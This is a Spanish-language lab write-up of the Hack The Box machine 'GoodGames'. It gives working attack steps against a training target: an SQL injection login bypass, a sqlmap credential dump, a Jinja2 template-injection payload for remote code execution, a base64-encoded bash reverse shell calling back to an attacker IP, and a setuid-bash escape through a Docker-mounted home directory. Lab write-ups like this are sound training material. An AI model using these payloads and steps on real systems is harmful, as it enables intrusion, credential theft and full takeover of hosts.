---
title: "GoodGames Writeup"
date: "2025-02-06"
categories: [writeups]
---

# GoodGames Writeup

## Scanning & Enumeration

```
nmap -p- -v --open -n -T5 -Pn 10.10.11.130

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-30 11:21 EST
Initiating SYN Stealth Scan at 11:21
Scanning 10.10.11.130 [65535 ports]
Discovered open port 80/tcp on 10.10.11.130
Completed SYN Stealth Scan at 11:22, 12.34s elapsed (65535 total ports)
Nmap scan report for 10.10.11.130
Host is up (0.041s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
Raw packets sent: 65643 (2.888MB) | Rcvd: 65594 (2.624MB)
```

Al aplicar un `whatweb 10.10.11.130` nos da el siguiente resultado:

```
whatweb 10.10.11.130
http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Llamando la atención el uso de Flask. Flask es un framework web codificado en Python que permite desarrollar aplicaciones web en Python de forma simple. Y que es un framework web? Un framework web es una colección de librerías y módulos que permite a los desarrolladores web programar aplicaciones sin preocuparse por detalles de bajo nivel como protocolos, manejo de hilos entre otros...

Al visitar la web, podemos ver como hay entradas de blog de dos usuarios:

- admin
- Wolfenstein

## Gaining Access & Explotation
Encontré un panel de login que realiza la siguiente petición petición al servidor:

```
POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://10.10.11.130
Connection: keep-alive
Referer: http://10.10.11.130/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=admin%40goodgames.htb&password=admin
```

Al realizar la petición, tratamos de modificarla para realizar una SQL Injection Error-Based y ver si podemos saltarnos la autenticación. Cabe mencionar que **el usuario debe de existir**, de lo contrario la autenticación no se realizará por que no existe ningún usuario con ese nombre.

```
POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://10.10.11.130
Connection: keep-alive
Referer: http://10.10.11.130/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=admin%40goodgames.htb' OR 1=1&password=admin
```

Esto nos daría acceso como administrador:

![/assets/img/writeups/goodgames/htb-writeup-goodgames-1.png](/assets/img/writeups/goodgames/htb-writeup-goodgames-1.png)

En el panel de configuración nos lleva a la siguiente página: http://internal-administration.goodgames.htb/index. Esto implica hacer un pequeño en nuestro archivo `/etc/hosts` con el comando `sudo nano /etc/hosts` para poder acceder ya que requiere de resolución DNS.

```
127.0.0.1       localhost
127.0.1.1       blackbox
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.130    goodgames.htb internal-administration.goodgames.htb
```

Podemos reutilizar la petición anteriormente utilizada:

```
POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://10.10.11.130
Connection: keep-alive
Referer: http://10.10.11.130/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=admin%40goodgames.htb&password=admin
```

Para ponerlo en un archivo `.req` y pasarlo por `sqlmap`:

`sqlmap -r goodgames.req --dbs`
`sqlmap -r goodgames.req -D main --tables`
`sqlmap -r goodgames.req -D main -T user --columns`
`sqlmap -r goodgames.req -D main -T user -C email,password --dump`

Esto nos dará las credenciales de acceso:

`admingoodgames.htb:superadministrator`

Si recordamos, anteriormente mencioné que llamaba la atención el uso de Flask para desarrollo Web. Normalmente, se hace uso de motores de plantilla como jinja2 entre otros conjuntamente con Flask para el desarrollo web. Esto, aunque no siempre, puede derivar en ataques SSTI.

Un ataque SSTI es cuando se explota la sintaxis nativa de una plantilla (como jinja2) para inyectar código malicioso de manera que se ejecute posteriormente en el lado servidor. Por eso se llama Server-Side Template Injection (SSTI).

Entonces buscamos algún input field o algún campo que como usuario, tenga capacidad de escribir.

Abrimos Burpsuite e interceptamos la petición, modificando el valor de test por `{{7*7}}`:

```
POST /settings HTTP/1.1
Host: internal-administration.goodgames.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://internal-administration.goodgames.htb
Connection: keep-alive
Referer: http://internal-administration.goodgames.htb/settings
Cookie: session=.eJwljjtqBTEMAO_iOoUl2frsZRbLlkgIJLCfKuTub-GVM83MX9nziPOzbNdxx0fZv1bZipKvsZhIqampV8KFQJBNwNAHkctwcq0yI7zJRHM2a6w0wFtAWvPBIcANx-SBKMFdpAc4EIMF8ByhAtglclbxniHVUtSkPCP3Gcf7Bh6c55H79fsdP48gY4Yn0Ss2c09zEtIEnACr60qzmmpe_l9VZT34.Z5pGiQ.bPlK4zFkG7YSTe5k_dNkiz-txIY
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name={{7*7}}
```

![/assets/img/writeups/goodgames/htb-writeup-goodgames-3.png](/assets/img/writeups/goodgames/htb-writeup-goodgames-3.png)

Con esto podemos identificar la plantilla jinja2. Ya que este cálculo matemático es típico de una vulnerabilidad SSTI en el motor de platilla Jinja2.

A continuación intentamos ejecutar un RCE (Remote Code Execution):

![/assets/img/writeups/goodgames/htb-writeup-goodgames-2.png](/assets/img/writeups/goodgames/htb-writeup-goodgames-2.png)

```
POST /settings HTTP/1.1

Host: internal-administration.goodgames.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 85

Origin: http://internal-administration.goodgames.htb

Connection: keep-alive

Referer: http://internal-administration.goodgames.htb/settings

Cookie: session=.eJwljjtqBTEMAO_iOoUl2frsZRbLlkgIJLCfKuTub-GVM83MX9nziPOzbNdxx0fZv1bZipKvsZhIqampV8KFQJBNwNAHkctwcq0yI7zJRHM2a6w0wFtAWvPBIcANx-SBKMFdpAc4EIMF8ByhAtglclbxniHVUtSkPCP3Gcf7Bh6c55H79fsdP48gY4Yn0Ss2c09zEtIEnACr60qzmmpe_l9VZT34.Z5pGiQ.bPlK4zFkG7YSTe5k_dNkiz-txIY

Upgrade-Insecure-Requests: 1

Priority: u=0, i

name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Como podemos ejecutar comandos de forma remota, lo que vamos a hacer es crearnos una reverse shell hacia nuestro sistema para hacerlo más comodo y tener acceso total por terminal:

`nc -nlvp 1234`

A continuación, ponemos en base64 nuestra reverse shell (adaptad el puerto y la dirección IP a vuestro caso particular):

```
echo "bash -i >& /dev/tcp/10.10.14.27/1234 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy8xMjM0IDA+JjEK
```

Ahora con la reverse shell en base64 `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy8xMjM0IDA+JjEK`, procedemos a ejecutarlo en el servidor actualizando la petición:

```
POST /settings HTTP/1.1

Host: internal-administration.goodgames.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 158

Origin: http://internal-administration.goodgames.htb

Connection: keep-alive

Referer: http://internal-administration.goodgames.htb/settings

Cookie: session=.eJwljjtqBTEMAO_iOoUl2frsZRbLlkgIJLCfKuTub-GVM83MX9nziPOzbNdxx0fZv1bZipKvsZhIqampV8KFQJBNwNAHkctwcq0yI7zJRHM2a6w0wFtAWvPBIcANx-SBKMFdpAc4EIMF8ByhAtglclbxniHVUtSkPCP3Gcf7Bh6c55H79fsdP48gY4Yn0Ss2c09zEtIEnACr60qzmmpe_l9VZT34.Z5pGiQ.bPlK4zFkG7YSTe5k_dNkiz-txIY

Upgrade-Insecure-Requests: 1

Priority: u=0, i

name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjcvMTIzNCAwPiYx"|base64 -d|bash').read() }}
```

Fijaos que para ejecutarlo se modifica el comando a ejecutar:

`echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjcvMTIzNCAwPiYx"|base64 -d|bash`

Esto le indica que sobre la cadena de texto enviada, se decodifique y posteriormente se ejecute mediante la bash shell.

Esto nos dará acceso al servidor:

```
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.11.130] 49086
sh: 0: can't access tty; job control turned off
# whoami
root
```

Ahora tenemos una TTY pero poco práctica, ya que no podremos movernos con normalidad en la terminal. Para ello, ejecutaremos la siguiente serie de comandos:

Empezamos en la reverse shell obtenida

`script /dev/null -c bash`

Luego de esto presionamos ctrl_z para suspender la shell

```
^Z
stty raw -echo; fg
```

Ahora resetearemos la configuración de la shell que dejamos en segundo plano indicando reset y xterm

```
[1]  + continued  nc -nlvp 443
                              reset
                              reset: unknown terminal type unknown
Terminal type? xterm
```

Exportamos las variables de entorno TERM y SHELL

- export TERM=xterm -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una xterm al momento de reiniciarlo la variable de entorno TERM vale dump (Se usa esta variable para poder usar los atajos de teclado).
- export SHELL=bash -> Para que nuestra shell sea una bash.

```
www-data@host:/$ export TERM=xterm
www-data@host:/$ export SHELL=bash
```

Ya con esto hecho tendríamos una TTY full interactiva, pero falta una cosa para que sea lo más comoda posible, setear las filas y columnas, esto para poder ocupar toda nuestra pantalla ya que en este momento solo podemos usar una porción de esta

Vemos el tamaño de nuestra shell en una consola normal

```
stty size
81 316
```

Y las seteamos en la reverse shell (en mi caso 81 filas y 316 columnas)

`www-data@host:/$ stty rows 81 columns 316`

Al hacer un `ls` o un `id`, nos daremos cuenta de que estamos dentro de un contenedor docker:

```
root) gid=0(root) groups=0(root)
root@3a453ab39d3d:/backend# ls
Dockerfile  project  requirements.txt
root@3a453ab39d3d:/backend# 
```

## Lateral Movement

Tras no encontrar nada taas una profunda búsqueda, finalmente, en el directorio `/home`, encontraremos otro directorio llamado `augustus`, donde si nos fijamos veremos que los permisos están asociados al `UID 1000`. Por lo tanto, esto nos hace pensar que el volumen /home está montado en el contenedor docker, ya que el `UID 1000` se suele asignar directamente al usuario que se crea por defecto a la hora de instalar un sistema linux:

```
root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Jan 30 16:21 user.txt
```

Es cuando entonces,si realizamos un `mount` veremos como`/dev/sda1` está montado:

```
root@3a453ab39d3d:/home/augustus# mount | grep "/dev/"
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
```

La enumeración de los adaptadores de la red indican que la IP interna del contenedor es `172.19.0.2`. Normalmente, docker suele asginar la primera dirección IP de la subnet al sistema host en las configuraciones por defecto. Por lo tanto, si la la dirección IP interna del contenedor es `172.19.0.2` la dirección IP de la subnet asignada directamente al host debería de ser `172.19.0.1`.

Para asegurarnos de que es cierto hacemos un `ping sweep`:

```
root@3a453ab39d3d:/home/augustus# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.027 ms
```

Entonces, podemos escanear la dirección IP `172.19.0.1` para tratar de realizar un movimiento lateral en base a los puertos abiertos encontrados

```
root@3a453ab39d3d:/home/augustus# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
22 open
80 open
```

La forma en la que se realiza el escaneo y el ping, es utilizando el propio bash, esto es muy útil ya que normalmente en entornos de producción no dispondremos de herramientas que permitan escanear la red.

Sabiendo que tenemos el puerto 22 abierto, podemos hacer una reutilización de contraseña, la misma que crackeamos gracias a la inyección SQL:

```
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$
```

## Privilege Scalation

Una vez que hemos conseguido acceso, tenemos que recordar que el volumen montado es /home, y que por defecto el usuario del contenedor es root. Esto nos permite ganar acceso como root de forma simple:

Lo primero es copiar la shell `/bin/bash` en el propio directorio de augustus, y luego salir para volver al contenedor y así cambiarle los permisos para que root sea el propietario y pueda ser ejecutado por cualquier usuario. Cuando tratemos de volver a conectarnos con el usuario augustus, si ejecutamos elc omando `bash -p`, nos dará root automáticamente.

```
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# ls
RunC-CVE-2019-5736  RunC-CVE-2019-5736.zip  bash  linpeas.sh  user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4755 bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 31 18:39:47 2025 from 172.19.0.2
augustus@GoodGames:~$ ls
bash user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1#
```

## Resources

Links:
1. https://www.geeksforgeeks.org/types-of-sql-injection-sqli/
2. https://pythonbasics.org/what-is-flask-python/
3. https://juncotic.com/jinja2-en-flask-introduccion/
4. https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/
5. https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
6. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com
7. https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
8. https://www.revshells.com/
9. https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/
10. https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
11. https://invertebr4do.github.io/tratamiento-de-tty/#